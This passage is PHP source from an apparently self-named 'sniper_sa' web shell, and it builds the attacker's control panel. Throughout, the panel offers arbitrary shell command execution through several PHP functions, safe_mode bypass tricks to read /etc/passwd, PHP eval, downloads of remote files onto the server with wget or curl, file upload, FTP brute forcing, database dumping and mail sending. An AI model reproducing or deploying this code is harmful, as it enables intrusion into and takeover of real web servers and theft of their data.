  else if(!$sql-&gt;select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql-&gt;dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql-&gt;dump as $v) echo $v."\r\n"; }
   else if($fp){ foreach($sql-&gt;dump as $v) @fputs($fp,$v."\r\n"); }
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 }
echo "&lt;/textarea&gt;&lt;/div&gt;";
echo "&lt;/b&gt;";
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
echo "&lt;table width=100% cellpadding=0 cellspacing=0&gt;";
function div_title($title, $id)
{
  return '&lt;a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');"&gt;'.$title.'&lt;/a&gt;';
}
function div($id)
 {
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '&lt;div id="'.$id.'" style="display: none;"&gt;';
 return '&lt;div id="'.$id.'"&gt;';
 }

if(!$safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','cmd',85,''));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text208'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select name=\"method\"&gt;
                            &lt;option value=\"system\" &lt;? if ($method==\"system\") { echo \"selected\"; } ?&gt;system&lt;/option&gt;
                            &lt;option value=\"passthru\" &lt;? if ($method==\"passthru\") { echo \"selected\"; } ?&gt;passthru&lt;/option&gt;
                            &lt;option value=\"exec\" &lt;? if ($method==\"exec\") { echo \"selected\"; } ?&gt;exec&lt;/option&gt;
                            &lt;option value=\"shell_exec\" &lt;? if ($method==\"shell_exec\") { echo \"selected\"; } ?&gt;shell_exec&lt;/option&gt;
                            &lt;option value=\"popen\" &lt;? if ($method==\"popen\") { echo \"selected\"; } ?&gt;popen&lt;/option&gt;
                            &lt;option value=\"proc_open\" &lt;? if ($method==\"proc_open\") { echo \"selected\"; } ?&gt;proc_open&lt;/option&gt;
                      &lt;/select&gt;".in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;".in('text','command',54,(!empty($_POST['command'])?($_POST['command']):("id"))).in('hidden','cmd',0,'command').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text223'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select name=\"method\"&gt;
                            &lt;option value=\"file\" &lt;? if ($method==\"file\") { echo \"selected\"; } ?&gt; file&lt;/option&gt;
                            &lt;option value=\"fread\" &lt;? if ($method==\"fread\") { echo \"selected\"; } ?&gt; fread&lt;/option&gt;
                            &lt;option value=\"show_source\" &lt;? if ($method==\"show_source\") { echo \"selected\"; } ?&gt; show_source&lt;/option&gt;
                            &lt;option value=\"readfile\" &lt;? if ($method==\"readfile\") { echo \"selected\"; } ?&gt; readfile&lt;/option&gt;
                      &lt;/select&gt;".in('hidden','file',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;".in('text','file',41,'/etc/passwd').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text43'].$arrow."&lt;/b&gt;",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text200'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;",in('text','snn',85,'/etc/passwd').in('hidden','cmd',0,'copy').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text300'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;",in('text','SnIpEr_SA',85,'/etc/passwd').in('hidden','cmd',0,'cURL').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text203'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;",in('text','ini_restore',85,'/etc/passwd').in('hidden','cmd',0,'ini_restore').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text224'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"plugin\"&gt;&lt;option value=\"plugin\"&gt;/etc/passwd&lt;/option&gt;&lt;/option&gt;&lt;/select&gt;".in('hidden','cmd',0,'plugin').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id12').$table_up2.div('id12').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;");
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysqlb').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text220'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','sym1p2',50,(!empty($_POST['sym1p2'])?($_POST['sym1p']):("/../../../"))).in('text','sym1p',50,(!empty($_POST['sym1p'])?($_POST['sym1p']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text222'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
{
echo $fs.$table_up1.div_title($lang[$language.'_text204'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text205'].$arrow."&lt;/b&gt;",in('text','log',96,(!empty($_POST['log'])?($_POST['log']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'?? ??? ???? ???????? ???????? filename.php?ss=http://shell.txt?').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text207'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text206'].$arrow."&lt;/b&gt;",in('text','glob',85,'/etc/').in('hidden','cmd',0,'glob').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text209'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text206'].$arrow."&lt;/b&gt;",in('text','root',85,'/etc/').in('hidden','cmd',0,'root').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text210'],'id11').$table_up2.div('id11').$ts;
echo "&lt;table class=table1 width=100% align=center&gt;";
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','zend',85,(!empty($_POST['zend'])?($_POST['zend']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'zend').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $table_up1.div_title($lang[$language.'_text211'],'id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text212']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;",in('text','php_ini1',10,'php.ini').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text213']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;",in('text','htacces',10,'htaccess').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text218']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;",in('text','file_ini',10,'ini.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text221'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;",in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text17'].$arrow."&lt;/b&gt;".in('text','funzip',78,"$dir/file"));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text65'].$arrow."&lt;/b&gt;",in('text','fzip',105,"$dir/sploitz.zip").ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text219'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;",in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text17'].$arrow."&lt;/b&gt;".in('text','filefrom',78,'http://website.com/file.txt'));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text21'].$arrow."&lt;/b&gt;",in('text','fileto',105,filename_.php).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
$aliases2 = '';
foreach ($aliases as $alias_name=&gt;$alias_cmd)
 {
 $aliases2 .= "&lt;option&gt;$alias_name&lt;/option&gt;";
 }
echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id6').$table_up2.div('id6').$ts;
echo sr(15,"&lt;b&gt;".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."&lt;/b&gt;","&lt;select name=alias&gt;".$aliases2."&lt;/select&gt;".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text58'].$arrow."&lt;/b&gt;",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."&lt;select name=action&gt;&lt;option value=create&gt;".$lang[$language.'_text65']."&lt;/option&gt;&lt;option value=delete&gt;".$lang[$language.'_text66']."&lt;/option&gt;&lt;/select&gt;".ws(3)."&lt;select name=what&gt;&lt;option value=file&gt;".$lang[$language.'_text59']."&lt;/option&gt;&lt;option value=dir&gt;".$lang[$language.'_text60']."&lt;/option&gt;&lt;/select&gt;".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text68'].$arrow."&lt;/b&gt;","&lt;select name=what&gt;&lt;option value=mod&gt;CHMOD&lt;/option&gt;&lt;option value=own&gt;CHOWN&lt;/option&gt;&lt;option value=grp&gt;CHGRP&lt;/option&gt;&lt;/select&gt;".ws(2)."&lt;b&gt;".$lang[$language.'_text69'].$arrow."&lt;/b&gt;".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."&lt;b&gt;".$lang[$language.'_text70'].$arrow."&lt;/b&gt;".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id7').$table_up2.div('id7').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text52'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text53'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"&lt;b&gt;".$lang[$language.'_text55'].$arrow."&lt;/b&gt;",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id8').$table_up2.div('id8').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text72'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text73'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"&lt;b&gt;".$lang[$language.'_text74'].$arrow."&lt;/b&gt;",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id9').$table_up2.$font;
echo "&lt;div align=center&gt;".div('id9')."&lt;textarea name=php_eval cols=100 rows=3&gt;";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"sniper_sa.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "&lt;/textarea&gt;";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "&lt;br&gt;".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "&lt;/div&gt;&lt;/div&gt;&lt;/font&gt;";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id10').$table_up2.div('id10').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
echo "&lt;table class=table1 width=100% align=center&gt;";
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}

if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id13').$table_up2.div('id13').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&$unix&&function_exists('mb_send_mail')){
echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id22').$table_up2.div('id22').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_list')){
echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_body')){
echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id24').$table_up2.div('id24').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id25').$table_up2.div('id25').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text116'].$arrow."&lt;/b&gt;",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text117'].$arrow."&lt;/b&gt;",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "&lt;form name=upload method=POST ENCTYPE=multipart/form-data&gt;";
echo $table_up1.div_title($lang[$language.'_text5'],'id14').$table_up2.div('id14').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text6'].$arrow."&lt;/b&gt;",in('file','userfile',85,''));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text21'].$arrow."&lt;/b&gt;",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(!$safe_mode&&$unix){
echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"with\"&gt;&lt;option value=\"wget\"&gt;wget&lt;/option&gt;&lt;option value=\"fetch\"&gt;fetch&lt;/option&gt;&lt;option value=\"lynx\"&gt;lynx&lt;/option&gt;&lt;option value=\"links\"&gt;links&lt;/option&gt;&lt;option value=\"curl\"&gt;curl&lt;/option&gt;&lt;option value=\"GET\"&gt;GET&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text17'].$arrow."&lt;/b&gt;".in('text','rem_file',78,'http://'));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text59'].$arrow."&lt;/b&gt;",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
if(@function_exists("ftp_connect")){
echo $table_up1.div_title($lang[$language.'_text93'],'id17').$table_up2.div('id17').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text87']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text100']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if($unix && @function_exists("ftp_connect")){
echo $fs.$table_up1.div_title($lang[$language.'_text94'],'id18').$table_up2.div('id18').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo sr(15,"","&lt;font face=tahoma size=-2&gt;".$lang[$language.'_text99']." ( &lt;a href=".$_SERVER['PHP_SELF']."?users&gt;".$lang[$language.'_text95']."&lt;/a&gt; )&lt;/font&gt;");
echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(@function_exists("mail")){
echo $table_up1.div_title($lang[$language.'_text102'],'id19').$table_up2.div('id19').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text103']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text108'].$arrow."&lt;/b&gt;",'&lt;textarea name=text cols=33 rows=2&gt;'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'&lt;/textarea&gt;');
